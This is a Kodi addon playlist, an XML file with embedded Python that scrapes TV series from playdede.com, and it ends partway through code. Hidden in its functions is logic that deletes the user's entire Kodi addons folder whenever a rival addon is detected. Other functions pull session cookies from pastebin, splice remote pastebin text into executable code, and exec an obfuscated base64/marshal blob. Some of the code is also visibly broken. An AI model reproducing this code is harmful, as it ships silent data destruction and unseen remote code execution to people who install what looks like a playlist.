<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<items>








<item>
<title>[COLOR gold]* [COLOR lightseagreen]Ho Series android[COLOR lightseagreen][[COLOR white]Buscador[COLOR lightseagreen]][/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
from Six.moves import urllib_parse
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)class="item tvshows">.*?href="(https://playdede.com/serie.*?)".*?src="(.*?)".*?<p>(.*?)<.*?<h3>(.*?)<.*?span>(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    Palabra_Buscada = xbmcgui.Dialog().input('Buscar Peliculas: ', type=xbmcgui.INPUT_ALPHANUM)
    Palabra_Buscada = urllib_parse.quote_plus(six.ensure_str(palabrabuscada))
    response = requests.get('https://playdede.com/search/?s='+Palabra_Buscada, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+'*'+response))
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        anio = item[2]
        titulo = item[3]
        titulo = six.ensure_str(titulo)
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
        response = requests.get('https://playdede.com/embed.php?id='+url+'&width=601&height=540', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}).text
        response = six.ensure_str(response)
        url_post = re.findall(patron, response)[0]
    except:
        response = 'NADA_LOGUEO'
    contador = 0
    while 'NADA_LOGUEO' in response or 'Cloudflare Ray ID:' in response or 'Olvidaste tu contrase' in response:
        try:
            cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
            response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
            response = six.ensure_str(response)
            url_post = re.findall(patron, response)[0]
        except:
            response = 'NADA_LOGUEO'
        contador += 1
        if 10 == contador:
            break
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+str(contador)+'*'+response))
    return url_post.replace('\/', '/')
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/S1r1T5Y.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>













<item>
<title>[COLOR gold]* [COLOR lightseagreen]H Series android[COLOR lightseagreen][[COLOR white]Buscador[COLOR lightseagreen]][/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)class="item tvshows">.*?href="(https://playdede.com/serie.*?)".*?src="(.*?)".*?<p>(.*?)<.*?<h3>(.*?)<.*?span>(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    Palabra_Buscada = xbmcgui.Dialog().input('Buscar Peliculas: ', type=xbmcgui.INPUT_ALPHANUM)
    Palabra_Buscada = six.ensure_str(Palabra_Buscada).replace(" ", "+").replace("á", "a").replace("é", "e").replace("í", "i").replace("á", "a").replace("ú", "u")
    response = requests.get('https://playdede.com/search/?s='+Palabra_Buscada, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+'*'+response))
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        anio = item[2]
        titulo = item[3]
        titulo = six.ensure_str(titulo).replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
